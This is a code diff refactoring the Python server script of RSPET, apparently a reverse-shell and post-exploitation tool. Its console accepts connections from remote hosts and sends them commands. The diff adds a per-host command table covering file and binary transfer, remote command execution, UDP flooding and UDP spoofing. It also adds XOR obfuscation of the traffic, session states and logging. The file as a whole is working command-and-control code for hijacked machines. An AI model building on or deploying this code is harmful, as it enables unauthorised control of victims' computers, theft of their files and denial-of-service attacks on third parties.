@@ -1,26 +1,35 @@
 #!/usr/bin/env python2
+# -*- coding: <UTF-8> -*-
+"""rspet_server.py: RSPET's Server-side script."""
 from __future__ import print_function
+from sys import argv
+from sys import exit as sysexit
 from socket import socket, AF_INET, SOCK_STREAM
 from socket import error as sock_error
-from sys import exit as sysexit
-from sys import argv
+from datetime import datetime
 from thread import start_new_thread
 from threading import Thread
-from Plugins.mount import Plugin
 import json
+from Plugins.mount import Plugin
 import tab
-import Plugins.essentials
 
-class Console:
-    """Class to interfere with the server."""
-    max_conns = 5 # Maximum connections that the server accepts
-    server = None # The server object
+
+class Console(object):
+    """Class to interface with the server."""
     prompt = "~$ " # Current command prompt
+    states = {}
+    state = "basic"
+    quit_signal = False
 
     def __init__(self, max_conns=5):
-        """Starts server"""
+        """Start server and initialize states."""
         self.max_conns = max_conns
         self.server = Server()
+        #If done directly @ Class attributes, Class funcs are not recognised.
+        Console.states['basic'] = Console._basic
+        Console.states['connected'] = Console._connected
+        Console.states['multiple'] = Console._multiple
+        Console.states['all'] = Console._all
 
     def __del__(self):
         del self.server
@@ -34,25 +43,43 @@ class Console:
             print("Address is already in use")
             sysexit()
 
-        while True:
+        while not Console.quit_signal:
             try:
-                cmd = raw_input(self.prompt)
-            except (KeyError, KeyboardInterrupt):
+                cmd = raw_input(Console.prompt)
+            except KeyboardInterrupt:
                 raise KeyboardInterrupt
 
             cmdargs = cmd.split(" ")
+            try:
+                #"Sanitize" user input by stripping spaces in the begining.
+                while cmdargs[0] == "":
+                    del cmdargs[0]
+            except IndexError: #Check if command was empty.
+                continue
             cmd = cmdargs[0]
             del cmdargs[0]
-            self.server.execute(cmd, cmdargs)
+            #Execute command.
+            tmp_state = self.server.execute(cmd, cmdargs)
+            try:
+                Console.states[tmp_state](self) #State transition.
+            except KeyError: #If none is returned make no state change.
+                continue
 
-            if len(self.server.selected) == 0:
-                self.prompt = "~$ "
-            elif len(self.server.selected) == 1:
-                self.prompt = "[%s]~$ " % self.server.selected[0].ip
-            elif len(self.server.selected) == len(self.server.hosts):
-                self.prompt = "[ALL]~$ "
-            else:
-                self.prompt = "[MULTIPLE]~$ "
+    def _basic(self):
+        Console.prompt = "~$ "
+        Console.state = "basic"
+
+    def _connected(self):
+        Console.prompt = "[%s]~$ " % self.server.selected[0].ip
+        Console.state = "connected"
+
+    def _multiple(self):
+        Console.prompt = "[MULTIPLE]~$ "
+        Console.state = "multiple"
+
+    def _all(self):
+        Console.prompt = "[ALL]~$ "
+        Console.state = "multiple"
 
     def _logo(self):
         """Print logo and Authorship/Licence."""
@@ -65,37 +92,35 @@ class Console:
         print(r"        \/        \/                   \/            ")
         print(r"")
         print(r" -Author: panagiks (http://panagiks.xyz)")
-        print(r" -Author: dzervas (http://dzervas.gr)")
+        print(r" -Co-Author: dzervas (http://dzervas.gr)")
         print(r" -Licence: MIT")
         print(r"#####################################################")
         print(r"")
 
-class Server:
+
+class Server(object):
     """Main class of the server. Manages server socket, selections and calls
     plugins."""
-    ip = "0.0.0.0"
-    port = "9000"
-    max_conns = 5
     hosts = [] # List of hosts
     selected = [] # List of selected hosts
     plugins = [] # List of active plugins
-    sock = None
     config = {}
 
     def __init__(self, max_conns=5, ip="0.0.0.0", port="9000"):
         """Starts to listen on socket"""
+        self._log("L", "Session Start.")
         self.ip = ip
         self.port = port
         self.max_conns = max_conns
-
         self.sock = socket(AF_INET, SOCK_STREAM)
-        self.sock.setblocking(1)
 
         try:
             self.sock.bind((ip, int(port)))
             self.sock.listen(max_conns)
+            self._log("L", "Socket bound @ %s:%s." %(self.ip, self.port))
         except sock_error:
-            print("Something went during binding & listening")
+            print("Something went wrong during binding & listening")
+            self._log("E","Error binding socket @ %s:%s." %(self.ip, self.port))
             sysexit()
 
         with open("config.json") as json_config:
@@ -103,6 +128,7 @@ class Server:
 
         for plugin in self.config["plugins"]:
             __import__("Plugins.%s" % plugin)
+            self._log("L", "%s plugin loaded." % plugin)
 
     def __del__(self):
         """Safely closes all sockets"""
@@ -110,11 +136,25 @@ class Server:
             del host
         self.sock.close()
 
+    def _log(self, level, action):
+        timestamp = datetime.now()
+        with open("log.txt", 'a') as logfile:
+            logfile.write("%s : [%s/%s/%s %s:%s:%s] => %s\n" %(level,
+                                                             str(timestamp.day),
+                                                             str(timestamp.month),
+                                                             str(timestamp.year),
+                                                             str(timestamp.hour),
+                                                             str(timestamp.minute),
+                                                             str(timestamp.second),
+                                                             action))
+
     def loop(self):
         """Main server loop. Better call it on its own thread"""
         while True:
             try:
                 (csock, (ip, port)) = self.sock.accept()
+                self._log("L", "New connection from %s:%s" % (str(ip),
+                                                              str(port)))
             except sock_error:
                 raise sock_error
             self.hosts.append(Host(csock, ip, port))
@@ -128,13 +168,12 @@ class Server:
         """
         if ids is None:
             self.selected = self.hosts
-            return self.selected
-
-        self.selected = []
-        for i in ids:
-            i = int(i)
-            self.selected.append(self.hosts[i])
-
+            #return self.selected
+        else:
+            self.selected = []
+            for i in ids:
+                i = int(i)
+                self.selected.append(self.hosts[i])
         return self.selected
 
     def execute(self, cmd, args):
@@ -146,32 +185,32 @@ class Server:
         It should accept len(args) - 1 arguments
         args    -- Arguments to pass to the command function"""
 
-        if len(cmd) == 0:
-            return
-
+        state = None
         try:
-            Plugin.__server_cmds__[cmd](self, args)
-        except KeyError:
-            if len(self.selected) > 0:
+            if Console.state in Plugin.__cmd_states__[cmd]:
                 try:
-                    for client in self.hosts:
-                        Plugin.__host_cmds__[cmd](client, args)
-                    return
+                    state = Plugin.__server_cmds__[cmd](self, args)
                 except KeyError:
-                    pass
-
-            print("Command not found. 'List_Commands' are your friends!")
+                    for client in self.selected:
+                        state = Plugin.__host_cmds__[cmd](client, args)
+            else:
+                print("Command not availble in current Interface.")
+        except KeyError:
+            print("Command not found. 'List_Commands' is your friend!")
+        return state
 
     def help(self):
         print("Server commands:")
         if Plugin.__server_cmds__ is not None:
             for cmd in Plugin.__server_cmds__:
-                print("\t%s: %s" % (cmd, Plugin.__server_cmds__[cmd].__doc__))
+                if Console.state in Plugin.__cmd_states__[cmd]:
+                    print("\t%s: %s" % (cmd, Plugin.__server_cmds__[cmd].__doc__))
 
-        if Plugin.__host_cmds__ is not None and len(self.selected) > 0:
+        if Plugin.__host_cmds__ is not None and Console.state != "basic":
             print("Host commands:")
             for cmd in Plugin.__host_cmds__:
-                print("\t%s: %s" % (cmd, Plugin.__host_cmds__[cmd].__doc__))
+                if Console.state in Plugin.__cmd_states__[cmd]:
+                    print("\t%s: %s" % (cmd, Plugin.__host_cmds__[cmd].__doc__))
 
     def clean(self):
         for host in self.hosts:
@@ -182,17 +221,26 @@ class Server:
             if host.deleteme:
                 del host
 
-class Host:
+    def quit(self):
+        Console.quit_signal = True
+
+class Host(object):
     """Class for hosts. Each Host object represent one host"""
-    ip = None
-    port = None
-    version = None
-    type = "full"
-    sock = None
-    deleteme = False
+    command_dict = {
+        'killMe'     : '00000',
+        'getFile'    : '00001',
+        'getBinary'  : '00002',
+        'sendFile'   : '00003',
+        'sendBinary' : '00004',
+        'udpFlood'   : '00005',
+        'udpSpoof'   : '00006',
+        'command'    : '00007',
+        'KILL'       : '00008'
+    }
 
     def __init__(self, sock, ip, port):
-        """Accepts the connection and initializes variables"""
+        """Accept the connection and initialize variables"""
+        self.deleteme = False
         self.sock = sock
         self.ip = ip
         self.port = port
@@ -221,27 +269,38 @@ class Host:
             return self._dec(self.sock.recv(size))
 
     def _enc(self, data):
-        """Encrypt message (before send)"""
-        out = bytearray(data, 'UTF-8')
-        for i in range(len(out)):
-            out[i] = out[i] ^ 0x41
-
-        return out
-
-    def _dec(self, data):
-        """Decrypt message (after receive)"""
+        """Obfuscate message (before send)"""
+        #out = bytearray(data, 'UTF-8')
         out = bytearray(data)
         for i in range(len(out)):
             out[i] = out[i] ^ 0x41
 
         return out
 
-if __name__ == "__main__":
-    cli = Console()
+    def _dec(self, data):
+        """Deobfuscate message (after receive)"""
+        out = bytearray(data)
+        for i in range(len(out)):
+            out[i] = out[i] ^ 0x41
+
+        return out
+
+
+def main():
     try:
-        cli.loop(int(argv[1]))
+        cli = Console(int(argv[1]))
     except IndexError:
+        cli = Console()
+    try:
         cli.loop()
-    except (KeyError, KeyboardInterrupt):
+    except KeyError:
+        print("Got KeyError")
         del cli
         sysexit()
+    except KeyboardInterrupt:
+        del cli
+        sysexit()
+    del cli
+
+if __name__ == "__main__":
+    main()
